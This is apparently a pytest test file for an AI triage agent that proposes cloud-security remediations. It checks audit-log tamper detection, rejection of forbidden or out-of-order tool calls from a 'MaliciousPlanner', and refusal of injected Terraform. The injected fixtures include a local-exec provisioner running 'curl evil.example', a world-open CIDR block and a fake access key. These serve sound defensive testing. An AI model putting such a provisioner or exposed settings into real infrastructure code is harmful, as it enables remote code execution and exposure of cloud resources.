import json
from datetime import date

import pytest

from cloudtriage.agent import Call, DeterministicPlanner, OpenAIPlanner, run_agent
from cloudtriage.audit import Audit, verify
from cloudtriage.remediation import propose, validate


def test_trace_and_audit_tampering(findings, policy, tmp_path):
    f = findings[0]
    audit = Audit()
    result = run_agent(
        f, None, policy.evaluate(f, None, date(2026, 10, 23)), DeterministicPlanner(), audit
    )
    assert len(result["trace"]) == 5
    path = tmp_path / "audit.jsonl"
    audit.write(path)
    assert verify(path) == 5
    path.write_text(path.read_text().replace("tool_completed", "tool_forged", 1))
    with pytest.raises(ValueError, match="chain"):
        verify(path)


class MaliciousPlanner:
    def __init__(self, call):
        self.call = call

    def next(self, history, context):
        return [self.call]

    def observe(self, calls, outputs):
        pass


@pytest.mark.parametrize(
    "call",
    [
        Call("terraform_apply", {}, "a"),
        Call("jira_submit", {}, "a"),
        Call("inspect_context", {"command": "env"}, "a"),
        Call("validate_remediation", {}, "a"),
        Call("propose_remediation", {}, "a"),
        Call("inspect_context", {}, "a"),  # repeated on second turn
    ],
)
def test_agent_rejects_forbidden_tools_arguments_order_repetition(findings, policy, call):
    f = findings[0]
    with pytest.raises(ValueError):
        run_agent(
            f, None, policy.evaluate(f, None, date(2026, 10, 23)), MaliciousPlanner(call), Audit()
        )


def test_early_finish_is_failure(findings, policy):
    class Empty(DeterministicPlanner):
        def next(self, history, context):
            return []

    f = findings[0]
    with pytest.raises(ValueError, match="gates"):
        run_agent(f, None, policy.evaluate(f, None, date(2026, 10, 23)), Empty(), Audit())


def test_all_remediation_templates_are_valid(findings):
    for finding in findings:
        proposal = propose(finding)
        assert validate(proposal, finding)["valid"]
        assert proposal["status"] == "proposal_only"


@pytest.mark.parametrize(
    "injected",
    [
        {"provisioner": {"local-exec": {"command": "curl evil.example"}}},
        {"cidr_blocks": ["0.0.0.0/0"]},
        {"access_key": "fake"},
        {"allow_nested_items_to_be_public": True},
    ],
)
def test_generated_iac_cannot_be_swapped(findings, injected):
    f = next(f for f in findings if f.kind == "storage_public")
    proposal = propose(f)
    proposal["terraform"] = injected
    assert not validate(proposal, f)["valid"]


def test_openai_tool_round_trip_contract(monkeypatch, findings, policy):
    requests = []
    names = [
        "inspect_context",
        "get_cve_evidence",
        "explain_policy",
        "propose_remediation",
        "validate_remediation",
    ]

    def fake_transport(url, **kwargs):
        payload = json.loads(json.dumps(kwargs["payload"]))
        requests.append(payload)
        index = len(requests) - 1
        output = (
            []
            if index == 5
            else [
                {
                    "type": "function_call",
                    "call_id": f"id-{index}",
                    "name": names[index],
                    "arguments": "{}",
                }
            ]
        )
        return {"status": "completed", "output": output}

    monkeypatch.setattr("cloudtriage.agent.request_json", fake_transport)
    f = findings[0]
    result = run_agent(
        f,
        None,
        policy.evaluate(f, None, date(2026, 10, 23)),
        OpenAIPlanner("test-only-token", "test-model"),
        Audit(),
    )
    assert result["validation"]["valid"] and len(requests) == 6
    assert all(r["store"] is False and r["max_output_tokens"] == 800 for r in requests)
    assert any(i.get("type") == "function_call_output" for i in requests[-1]["input"])
    assert f.asset not in json.dumps(requests)


def test_incomplete_provider_fails_closed(monkeypatch):
    monkeypatch.setattr("cloudtriage.agent.request_json", lambda *a, **k: {"status": "incomplete"})
    with pytest.raises(ValueError, match="incomplete"):
        OpenAIPlanner("test-only-token", "test-model").next([], {})
